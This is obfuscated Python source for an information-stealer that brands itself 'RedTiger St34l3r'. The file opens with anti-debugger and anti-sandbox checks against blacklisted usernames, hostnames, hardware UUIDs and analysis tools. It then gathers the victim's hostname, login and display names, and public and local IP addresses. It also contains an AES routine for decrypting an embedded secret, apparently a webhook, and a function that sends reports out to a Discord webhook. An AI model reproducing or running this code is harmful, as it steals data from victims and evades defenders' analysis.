
def EAQKKHOOPXKSASUFMLVKIJAZXHMNJFHOOPBGWUFFBTKZDQOBPCVAJBLWYCTJENQZJAKCRAG():
    import os
    import socket
    import subprocess
    import ctypes
    import sys
    import psutil

    EUDBBZWEZZJYEUWBATMERBJBQKXEAPJEIAVZBQVCLBQJSBWFSDZCWCPJLYYBFEHPIIAHWRWQQYLUZUH = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'Bruno' 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg', 'stephpie']
    VHUEHLPHODDQRDZOFYRLVRFHARDRUBFWZBZYOTKWFQVOVSPPXVEZMEU = ['0CC47AC83802', 'BEE7370C-8C0C-4', 'DESKTOP-ET51AJO', '965543', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42', 'test']
    BSHGCHZTRNKHHPYXNAGWQDPKUTRGXBXLWPZILUVZIYGAUHQCLWGXCPTMIELUERQNUNCTKEBEWLQYBUDBAZWQVWNPBILETP = ['671BC5F7-4B0F-FF43-B923-8B1645581DC8', '7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3', 'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026', 'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85', 'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D', 'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518', '38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009', 'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9', '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE', '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972', '8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE', 'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173', 'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '4DC32042-E601-F329-21C1-03F27564FD6C', 'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57', '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2', 'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5', '60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F', 'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00', '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57', 'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08', 'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661', '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
    VAGUIRVKJYWHRRVNHBVYHDOQSYLQKXOFOYPPXRYRDWEUJKOGNIINR = ['cheatengine', 'cheat engine', 'x32dbg', 'x64dbg', 'ollydbg', 'windbg', 'ida', 'ida64', 'ghidra', 'radare2', 'radare', 'dbg', 'immunitydbg', 'dnspy', 'softice', 'edb', 'debugger', 'visual studio debugger', 'lldb', 'gdb', 'valgrind', 'hex-rays', 'disassembler', 'tracer', 'debugview', 'procdump', 'strace', 'ltrace', 'drmemory', 'decompiler', 'hopper', 'binary ninja', 'bochs', 'vdb', 'frida', 'api monitor', 'process hacker', 'sysinternals', 'procexp', 'process explorer', 'monitor tool', 'vmmap', 'xperf', 'perfview', 'py-spy', 'strace-log']

    try:
        if sys.gettrace() is not None:
            return True
    except: pass

    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
    except: pass

    try:
        for v4r_proc in psutil.process_iter(['name']):
            try:
                WIEDUYOGZCEUMECPPTSXEZKVAMUEMCMHQURGXGSDXQVSBIZUPYXWEVRYYHRKJEELKXJJLATNTBP = str(v4r_proc.info['name']).lower()
                if any(debugger in WIEDUYOGZCEUMECPPTSXEZKVAMUEMCMHQURGXGSDXQVSBIZUPYXWEVRYYHRKJEELKXJJLATNTBP for debugger in VAGUIRVKJYWHRRVNHBVYHDOQSYLQKXOFOYPPXRYRDWEUJKOGNIINR):
                    return True
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
            continue
    except: pass

    try:
        if os.getlogin() in EUDBBZWEZZJYEUWBATMERBJBQKXEAPJEIAVZBQVCLBQJSBWFSDZCWCPJLYYBFEHPIIAHWRWQQYLUZUH:
            return True
        elif os.getlogin().lower() in [v4r_u53rn4m3.lower() for v4r_u53rn4m3 in EUDBBZWEZZJYEUWBATMERBJBQKXEAPJEIAVZBQVCLBQJSBWFSDZCWCPJLYYBFEHPIIAHWRWQQYLUZUH]:
            return True
    except: pass

    try:
        if socket.gethostname() in VHUEHLPHODDQRDZOFYRLVRFHARDRUBFWZBZYOTKWFQVOVSPPXVEZMEU:
            return True
        elif socket.gethostname().lower() in [v4r_h05tn4m3.lower() for v4r_h05tn4m3 in VHUEHLPHODDQRDZOFYRLVRFHARDRUBFWZBZYOTKWFQVOVSPPXVEZMEU]:
            return True
    except: pass

    try: 
        if subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip() in BSHGCHZTRNKHHPYXNAGWQDPKUTRGXBXLWPZILUVZIYGAUHQCLWGXCPTMIELUERQNUNCTKEBEWLQYBUDBAZWQVWNPBILETP:
            return True
    except: pass

    return False

try: FELRYHQIARQPZBNUHSIWZJJDFZJHCPYFNPDJPDCRSLDYHDBIPYEFLUAXKPQIHDKDPVUWSRWDKDUOBUCUFROVLIBNCIP = EAQKKHOOPXKSASUFMLVKIJAZXHMNJFHOOPBGWUFFBTKZDQOBPCVAJBLWYCTJENQZJAKCRAG()
except: FELRYHQIARQPZBNUHSIWZJJDFZJHCPYFNPDJPDCRSLDYHDBIPYEFLUAXKPQIHDKDPVUWSRWDKDUOBUCUFROVLIBNCIP = False

if FELRYHQIARQPZBNUHSIWZJJDFZJHCPYFNPDJPDCRSLDYHDBIPYEFLUAXKPQIHDKDPVUWSRWDKDUOBUCUFROVLIBNCIP == True:
    import sys
    sys.exit()

import sys

def SKDSOMCSUCYDQCKOLPJIXVYLHWIGYERDIYLGYMOBBBHCTAKNPWVEMGFUMGPGESYXMSYMRFPKGZCJZIONDECMGEMIXU():
    def DMPOCJBVRTBVGTBOXLHJEVKSDGAEONKEBUXEZNLSWJIIOJJGQDDGWFUQQJ():
        if sys.platform.startswith("win"):
            return False
        else:
            return True
    
    try: 
        YAFDYMJPOYDEDSGKMLDPKUQKMTGVRFASWIXHRETMWYVWREAJPPX = DMPOCJBVRTBVGTBOXLHJEVKSDGAEONKEBUXEZNLSWJIIOJJGQDDGWFUQQJ()
        if YAFDYMJPOYDEDSGKMLDPKUQKMTGVRFASWIXHRETMWYVWREAJPPX == True:
            return YAFDYMJPOYDEDSGKMLDPKUQKMTGVRFASWIXHRETMWYVWREAJPPX
    except:
        return True
    
if SKDSOMCSUCYDQCKOLPJIXVYLHWIGYERDIYLGYMOBBBHCTAKNPWVEMGFUMGPGESYXMSYMRFPKGZCJZIONDECMGEMIXU() == True:
    sys.exit()
    
import os
import socket
import win32api
import requests
import base64
import ctypes
import threading
import discord
from discord import SyncWebhook
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

def MMCAGSZWZDSFQXYALJPMTRRFXPEFLDABFYZRITMMYSYGZIBYWYQUUQEZSKEMNEICYIRMMWSGWUXDTGKBJMPI(): pass
def LZDRCCODRXJPYAVBAJWFMZPOTUCDJPLDPDMWQTBOBYMETAFFFSHLSLMHWVKVAQHHDKRWJNBYQPKORMCWYFLHKGOPVS(): pass
def IOJKEEPOMIGDLPTUQFXOSDHTZYPJTBQCZEMPQPLVMEODJBYGYCOPIVMTHJSEPBNKLNZGC(): pass
def EBSWALJNDUWLBQVFGXYFWZMUSECAJJMTQMYZGVHKXIFCMXEYFFFHZDRE(): pass
def YREEFIIWRQLFQXHIWCPOLMBEBCYOYMNIXUKHVDMWWABATUOIJAJBBEXWKLRMMXMOWZORLDHPDZGZPHH(): pass
def GIVPIEAYRJVOZUAECVWQTQZPWKGIXOWHDRYWWWPTXVDCIFTTPFSPNKZAB(): pass
def IAUNTQIYSOVFFSCPTXEKQHNCCZIVDLDSFZFIVCWMNJUBEBGKDNZVOVDQHQPEMOAMYLAFLRKYEOGBMWXIGXRF(): pass
def NVVXMHSRFSOBQJPYBHPMHMJQOVJWCNZAIVUQGHIOOEKVSISFVTFEEVHIVHRGLNHTLPLHUSCS(): pass
def DREFCSIUKMEVBGKWNDBIACHNKLSWOWXJEZVBXYBRZQBXQLIBASKMRXJUWOQWLZPUMQIWVOERONSGIPELBEGEJLJ(): pass
def MPXODCDRBHBTESRSGUCAQWQRNZENARTCTGPLLSLEKVHHNVGKRNYBAMZHNJEMZOUWDW(): pass
def VZOMEPYVBTOOMMPVFJBQPPLJDCPKBPVLCGQSRFAHQEYLPNBQNQHAOGHJBVCUKFVFTPJEXZUIA(): pass
def JNHZPSGUGLRWZWAUGKMMYSGZAXSXYBQOUDVICHCROEZSPWLTRXNCJZVVFFOWPRGVY(): pass
def NSLCUKVKYXSWKWPWEPIEDWEAWNQQRZAOYIALBFTYBFWLTUZJIPQIXRHD(): pass
def XLWFUSFBDRBLHBIEVCARNTOODYDJOBDBDJGTFMMDECRJIAABZOTSYCZIPZQUYRCJSFAVIYHFNMEYNR(): pass
def WQEHPMVXOJWYZACSDHZFXLCCRTJOYOVLAWHXAHXCSVTCKKAGGVTRGLTWZFXOOOUIRQCRTTMLILIFNAXJH(): pass
def JTNQNBJOAQXUCVZHGFTYUUWHPAIKCGQCOZRKBVBEXJORIHUSICIHMWSUMBP(): pass
def TYRQFGLPCFPNUAKLUDVWYCAILTUGEGEUNYAYDIJCWUZXMRSJTBJCWBLHZSZ(): pass
def UCNRCDNIUBZHCPMODDNAZTQSRBMWJOMVEHVEZIUNQSVVVRXZHWNDYYKMLHEBI(): pass
def MYHRKVRVXCZKMZXVIWRRBXZAIIKWADMROKKNOQPYDXGPHXIJCLZOWFBNPXRATWXVAYXWEMQYVNTDJLUUOBAPTPHPW(): pass
def LZAWHAVCIIWMYMRPATKRQDUTWLMJUDLLCKTSYPXVOVHXUYCQFVMALNXJZRWDD(): pass

def JYLFFAWPSFKUCMZGZDMJIKLJPPXWGRLMRITBULMBHCPESHWOZCRMKXLPLLFWNZRAMJAEBLLHQA(w3bh00k_ur1, title=None, description=None):
    try:
        client = SyncWebhook.from_url(w3bh00k_ur1)
        embed = discord.Embed(
            title=title,
            description=description,
            color= UZWWSUMHOOULCLVGSESALXIRPLUVNUMSHAYWLKTQUQPYJKZZAJTLG
        )
        embed.set_footer(text=ZEGRRDVSQIYWYKBGRMSNAHPPITRVDSABIATRSVBWNGINWGLPWBTONTBGLGWGSCKWTLLBAIKBDJLFYYWRXG, icon_url=CBYRGELXUIKPDUYMNSQBQLNDULQQYOPBNPSOXFDVQPHZFNRXGATNHUGJSNOMFDGYHBVMQGSKZJENFVSZTZXQCZZSW)
        client.send(embed=embed, username=PDHSHFGMMAJVSNBRHNDWCMJWDPOAITBFFSIMKXJQVHZPDCZGEONVALVPYKGUJGGNZXNHODXU, avatar_url=CBYRGELXUIKPDUYMNSQBQLNDULQQYOPBNPSOXFDVQPHZFNRXGATNHUGJSNOMFDGYHBVMQGSKZJENFVSZTZXQCZZSW)
    except: pass

def YAPXGMFFDJAXWCCAKBMXYHGNVWQYENGRDFMWAJEKGLPSLJFEOOEISAZNDIDGLRLCIBTZ(title):
    try:
        if sys.platform.startswith("win"):
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        elif sys.platform.startswith("linux"):
            sys.stdout.write(f"\x1b]2;{title}\x07")
    except:
        pass
        
def YHNUJQMVCZPFKEKAFUBGHUGVJQHIVFMSGKEUFUPVVSMTWBHZSEBJJZMEGWVQDSZWWHYWFTAJTAYD():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

def MWFBHMGOZSBGUWZIYHPMGBYACLTIAGMHJMFVMHIXXSDKQNDJPXLJI(FYMXKTPBZOWEPNBOSIGPABUIHBWYCAOBPOBHBIQJYHHTVLKXMPJSRAANSDPJJKWYUGNGOJNUXXQFVLYGZZJVAGVUDW, OLVKBWLIYWDLJHQHUXSNFOVFULFTGUAHPIZMNYWBNXEWOAILYWEZDNBHVPJJPUJVFWVBQSANBZKSFPPUVREQGEOHQIORWWYXDQOM):
    def CBWMBZLTLYFMTITYWGPSNYVWIIVXEQXNDXENAAZRRLNAVDANPLKOFDRZISGQQLCOSJLWSRSYIZGNMDYJPWMMLLPYHRCW(ZWTPLKVXOSYZVLZSHKOQEUHEPWAYMHPXLAZGNTVLTWQEXRWYWXAQAUOFCVDAZVGBUNSYSSSCZFIQEDNWZP, JVXNGRKXKVHDTTDWTNIJMCMHKHCCHHFYDOPFFIKGZWRKTZUFPHXKNOKP):
        KQTBNXARJOVETFALFPAWNIUJXBKZGOOFETWSLIBVBQGLSIQUZVJJZIULKUBUZVZKNHTEJOQQXHKNUVTOKIZGXXVHOJONHBF = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=JVXNGRKXKVHDTTDWTNIJMCMHKHCCHHFYDOPFFIKGZWRKTZUFPHXKNOKP, iterations=100000, backend=default_backend())
        if isinstance(ZWTPLKVXOSYZVLZSHKOQEUHEPWAYMHPXLAZGNTVLTWQEXRWYWXAQAUOFCVDAZVGBUNSYSSSCZFIQEDNWZP, str):  
            ZWTPLKVXOSYZVLZSHKOQEUHEPWAYMHPXLAZGNTVLTWQEXRWYWXAQAUOFCVDAZVGBUNSYSSSCZFIQEDNWZP = ZWTPLKVXOSYZVLZSHKOQEUHEPWAYMHPXLAZGNTVLTWQEXRWYWXAQAUOFCVDAZVGBUNSYSSSCZFIQEDNWZP.encode()  
        return KQTBNXARJOVETFALFPAWNIUJXBKZGOOFETWSLIBVBQGLSIQUZVJJZIULKUBUZVZKNHTEJOQQXHKNUVTOKIZGXXVHOJONHBF.derive(ZWTPLKVXOSYZVLZSHKOQEUHEPWAYMHPXLAZGNTVLTWQEXRWYWXAQAUOFCVDAZVGBUNSYSSSCZFIQEDNWZP)

    FYMXKTPBZOWEPNBOSIGPABUIHBWYCAOBPOBHBIQJYHHTVLKXMPJSRAANSDPJJKWYUGNGOJNUXXQFVLYGZZJVAGVUDW_data = base64.b64decode(FYMXKTPBZOWEPNBOSIGPABUIHBWYCAOBPOBHBIQJYHHTVLKXMPJSRAANSDPJJKWYUGNGOJNUXXQFVLYGZZJVAGVUDW)
    JVXNGRKXKVHDTTDWTNIJMCMHKHCCHHFYDOPFFIKGZWRKTZUFPHXKNOKP = FYMXKTPBZOWEPNBOSIGPABUIHBWYCAOBPOBHBIQJYHHTVLKXMPJSRAANSDPJJKWYUGNGOJNUXXQFVLYGZZJVAGVUDW_data[:16]
    SMFCAPGSGWUQAGUPMQCPYUSGZUBPKUDGUMWOHSNPHIQJKNHXBHNIGIUYOVYYZH = FYMXKTPBZOWEPNBOSIGPABUIHBWYCAOBPOBHBIQJYHHTVLKXMPJSRAANSDPJJKWYUGNGOJNUXXQFVLYGZZJVAGVUDW_data[16:32]
    FYMXKTPBZOWEPNBOSIGPABUIHBWYCAOBPOBHBIQJYHHTVLKXMPJSRAANSDPJJKWYUGNGOJNUXXQFVLYGZZJVAGVUDW_data = FYMXKTPBZOWEPNBOSIGPABUIHBWYCAOBPOBHBIQJYHHTVLKXMPJSRAANSDPJJKWYUGNGOJNUXXQFVLYGZZJVAGVUDW_data[32:]
    PWEKRVDIIQCVGVFECIQMKOHZBURPGCHOHQFEXIHZMFCNPWSRLGPCTVMERVHLTKMZMGXIYFLG = CBWMBZLTLYFMTITYWGPSNYVWIIVXEQXNDXENAAZRRLNAVDANPLKOFDRZISGQQLCOSJLWSRSYIZGNMDYJPWMMLLPYHRCW(OLVKBWLIYWDLJHQHUXSNFOVFULFTGUAHPIZMNYWBNXEWOAILYWEZDNBHVPJJPUJVFWVBQSANBZKSFPPUVREQGEOHQIORWWYXDQOM, JVXNGRKXKVHDTTDWTNIJMCMHKHCCHHFYDOPFFIKGZWRKTZUFPHXKNOKP)
    LUTPCACBDKBIJKUBRBLDBCALOENGZYSGGULXQVYMYDIJLGZJLYMCPBGJPJPKKRAZRFYJHSZCKHDTYVA = Cipher(algorithms.AES(PWEKRVDIIQCVGVFECIQMKOHZBURPGCHOHQFEXIHZMFCNPWSRLGPCTVMERVHLTKMZMGXIYFLG), modes.CBC(SMFCAPGSGWUQAGUPMQCPYUSGZUBPKUDGUMWOHSNPHIQJKNHXBHNIGIUYOVYYZH), backend=default_backend())
    VVPWGPMWFOCPEZBIJMAQGEVRGADDSNAMRHOOIWHAEHCREJSTHGJTYQSXYNXQFZAEFDBHS = LUTPCACBDKBIJKUBRBLDBCALOENGZYSGGULXQVYMYDIJLGZJLYMCPBGJPJPKKRAZRFYJHSZCKHDTYVA.decryptor()
    BPTSZBSJABAUTJHBTXLWBRXAYXWSNGYGAHKCRACZYDUXYENFYOYPJRLZFVGXBYESTJOCQBPBP = VVPWGPMWFOCPEZBIJMAQGEVRGADDSNAMRHOOIWHAEHCREJSTHGJTYQSXYNXQFZAEFDBHS.update(FYMXKTPBZOWEPNBOSIGPABUIHBWYCAOBPOBHBIQJYHHTVLKXMPJSRAANSDPJJKWYUGNGOJNUXXQFVLYGZZJVAGVUDW_data) + VVPWGPMWFOCPEZBIJMAQGEVRGADDSNAMRHOOIWHAEHCREJSTHGJTYQSXYNXQFZAEFDBHS.finalize()
    HQDBKXLISNNZEJWJGXJCBSOFDBMMNBDUSDBDZHNIAOSTOULSBTVATMLNYFCOUMOWCUUJXSDWYAUWKMKYXUOSGXOWQXVCGBCFSLMS = padding.PKCS7(128).unpadder()
    RRNMGGWDGOXMPEQBGPKCUPNUOCRCNZODSXRMTPDNOLDEQTUEZSGZNZRYLREKGPPMQNUVHTRVLRJCUYZTWHRPBEATNLIJV = HQDBKXLISNNZEJWJGXJCBSOFDBMMNBDUSDBDZHNIAOSTOULSBTVATMLNYFCOUMOWCUUJXSDWYAUWKMKYXUOSGXOWQXVCGBCFSLMS.update(BPTSZBSJABAUTJHBTXLWBRXAYXWSNGYGAHKCRACZYDUXYENFYOYPJRLZFVGXBYESTJOCQBPBP) + HQDBKXLISNNZEJWJGXJCBSOFDBMMNBDUSDBDZHNIAOSTOULSBTVATMLNYFCOUMOWCUUJXSDWYAUWKMKYXUOSGXOWQXVCGBCFSLMS.finalize()
    return RRNMGGWDGOXMPEQBGPKCUPNUOCRCNZODSXRMTPDNOLDEQTUEZSGZNZRYLREKGPPMQNUVHTRVLRJCUYZTWHRPBEATNLIJV.decode()

YAPXGMFFDJAXWCCAKBMXYHGNVWQYENGRDFMWAJEKGLPSLJFEOOEISAZNDIDGLRLCIBTZ("")

try: JYRKJPOHCTTXXWZTTWJXOSDYRKMKNEZVAHSTOGRMEIEKAFXLAVDLDLKDRPIMUWPTZEKY    = socket.gethostname()
except: JYRKJPOHCTTXXWZTTWJXOSDYRKMKNEZVAHSTOGRMEIEKAFXLAVDLDLKDRPIMUWPTZEKY = "None"

try: IGGQEJLCJEPBNULVOGOEMHPSIDCFUPXIVMWYOBYJTNQUXSWJPQBVHOQENIFMPHQPAIMRKVQODFUTMUSUEFKJIPYUB    = os.getlogin()
except: IGGQEJLCJEPBNULVOGOEMHPSIDCFUPXIVMWYOBYJTNQUXSWJPQBVHOQENIFMPHQPAIMRKVQODFUTMUSUEFKJIPYUB = "None"

try: NJQUIPVQDTOAHOJZOWWCYGWXXLOUWUJNYFSYJXYUINZQBMRFZUYLLODYZPUHLCNITKJISLXIQBLASNXBIYDTL    = win32api.GetUserNameEx(win32api.NameDisplay)
except: NJQUIPVQDTOAHOJZOWWCYGWXXLOUWUJNYFSYJXYUINZQBMRFZUYLLODYZPUHLCNITKJISLXIQBLASNXBIYDTL = "None"

try: TCMWHHLJKFTYETTJNQXBNATMYKDVVZWZFMSOMPDZMIKTDSGSWCJDQIJ    = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: TCMWHHLJKFTYETTJNQXBNATMYKDVVZWZFMSOMPDZMIKTDSGSWCJDQIJ = "None"

try: BFWEFYVFGHRKUTBDNMTLUFFEKPOPYYGFUJWHMRFXGRQLSZIFPAYPBRWGBAZDRLGTVZPHMCWYDWQGEOXHWIVJYAVOSZCXMC    = socket.gethostbyname(socket.gethostname())
except: BFWEFYVFGHRKUTBDNMTLUFFEKPOPYYGFUJWHMRFXGRQLSZIFPAYPBRWGBAZDRLGTVZPHMCWYDWQGEOXHWIVJYAVOSZCXMC = "None"

JMWLTCARHXDTFUMARQFTNOAKKWBCFSPJVVTYNHFDTXVHOMXPYZPLOFUZJYUFMHYROUCCYTPKCVSFJQIIYLWVRISGNFSQ = r"""
Ydnmn2HUyonFaKL/nS+DxdkL2YdX6Qv9sq33UxQUgXNrbKVn/5IvdKH8QgJeWpfEYvifvWrTWZZHUrBKpFA44KWTfin9yhANm1+BM12UCt0nkn2dkxuQhW4Uqm1JOrf/16+imC6lw44Dt45L54rtPRG5KdX6cOePSZ63C0rIcUUf3HjgHYv3BB2H4e4L0KBn44NWHGdcdZgdyzDyRwLSEQ==
"""

VLXQPBJPKGQKCTLNQNZYILVUOITMZHKJFLYXZXQFEUISKUKSECSFXECYOKZCVDBDAPZKQFQFLLOBZMKHKPCXOHYSB            = "JXKNLeMVPaJADzvzrvicuuZZnFhOxVXWYXNdVHbTGcCQaBopFgjbzdarnWfmZgouDNTpFaZEwfoCRGgfwsXhvNvmuKssWtxTvDBnZvzucLGcqPoXvvQUKjUhwqPVQJdosQIZrjkUJNwcwAiRcStagSEjzIXMWCfEBBHwMSbXgauk"
HHEMARVZDKRORFUTDGWXWMQGDFLDUVHIIXUAKAEOPFFNONWLWYGCQRDZAHVETTBXBZNSYIEPEMZQYLNMRCGAT        = "redtiger.shop"
UZWWSUMHOOULCLVGSESALXIRPLUVNUMSHAYWLKTQUQPYJKZZAJTLG    = 0xa80505
PDHSHFGMMAJVSNBRHNDWCMJWDPOAITBFFSIMKXJQVHZPDCZGEONVALVPYKGUJGGNZXNHODXU = "RedTiger St34l3r"
CBYRGELXUIKPDUYMNSQBQLNDULQQYOPBNPSOXFDVQPHZFNRXGATNHUGJSNOMFDGYHBVMQGSKZJENFVSZTZXQCZZSW   = "https://cdn.discordapp.com/attachments/1337898355279401023/1341890893858213908/RedTiger-Logo.png?ex=67b7a4c8&is=67b65348&hm=174ddbd80dd8570fa83779687def6eda441a7c12abd3765d970c1958ceeb1ec8&"
ZEGRRDVSQIYWYKBGRMSNAHPPITRVDSABIATRSVBWNGINWGLPWBTONTBGLGWGSCKWTLLBAIKBDJLFYYWRXG    = "RedTiger St34l3r - github.com/loxy0dev/RedTiger-Tools"
TOAFSHCYRLFMFPPUAYCVUILBBCJBEIFPQHSLXPQEHLDNDFAWGLHCRJAZLOJKHAWEXRTVURWOKRITUIGCRNMIPUQZAILLB   = {"text": ZEGRRDVSQIYWYKBGRMSNAHPPITRVDSABIATRSVBWNGINWGLPWBTONTBGLGWGSCKWTLLBAIKBDJLFYYWRXG, "icon_url": CBYRGELXUIKPDUYMNSQBQLNDULQQYOPBNPSOXFDVQPHZFNRXGATNHUGJSNOMFDGYHBVMQGSKZJENFVSZTZXQCZZSW}
JVQTLDADTYXKYZHMXTKHPNYLFIGLMMMLYWLGZYSTPVADECBDSENXNOQZXQKIRPEMBYFMICHEXRUQRVVCYKIJKDAZ    = f'`{IGGQEJLCJEPBNULVOGOEMHPSIDCFUPXIVMWYOBYJTNQUXSWJPQBVHOQENIFMPHQPAIMRKVQODFUTMUSUEFKJIPYUB} "{TCMWHHLJKFTYETTJNQXBNATMYKDVVZWZFMSOMPDZMIKTDSGSWCJDQIJ}"`'
